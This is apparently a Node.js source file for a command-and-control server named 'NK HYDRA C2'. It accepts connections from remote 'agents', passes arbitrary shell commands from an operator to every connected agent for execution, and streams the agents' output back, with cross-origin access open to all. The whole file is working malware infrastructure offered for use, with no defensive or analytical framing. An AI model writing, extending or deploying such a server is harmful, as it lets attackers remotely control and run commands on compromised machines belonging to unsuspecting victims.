/ NK HYDRA C2 SERVER v28.9
// COMMAND: node c2_server.js

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

// --- ROOT STATUS CHECK (Fixes "Cannot GET /") ---
app.get('/', (req, res) => {
    res.send("<html><body style='background:black;color:#00ff41;font-family:monospace;'><h1>NK HYDRA C2 HIVE: ONLINE</h1><p>Status: WAITING_FOR_AGENTS</p></body></html>");
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    pingTimeout: 60000
}); 

// LOGGING
console.log("[*] INITIALIZING C2 SERVER...");

io.on('connection', (socket) => {
    
    socket.on('identify', (data) => {
        if (data.type === 'agent') {
            console.log(`[+] AGENT CONNECTED: ${data.id}`);
            io.emit('log', `[SYSTEM] AGENT CONNECTED: ${data.id}`);
            io.emit('status', { agents: [{ id: data.id, status: 'ONLINE', ip: 'REMOTE' }] });
        }
    });

    socket.on('cmd', (data) => {
        console.log(`[CMD RELAY] ${data.cmd}`);
        io.emit('exec', data); // Broadcast to agents
        io.emit('log', `[C2] EXECUTING: ${data.cmd}`);
    });

    socket.on('stream_log', (data) => {
        console.log(`[${data.from}] ${data.output}`);
        io.emit('log', data);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`[+] SERVER LISTENING ON PORT ${PORT}`);
});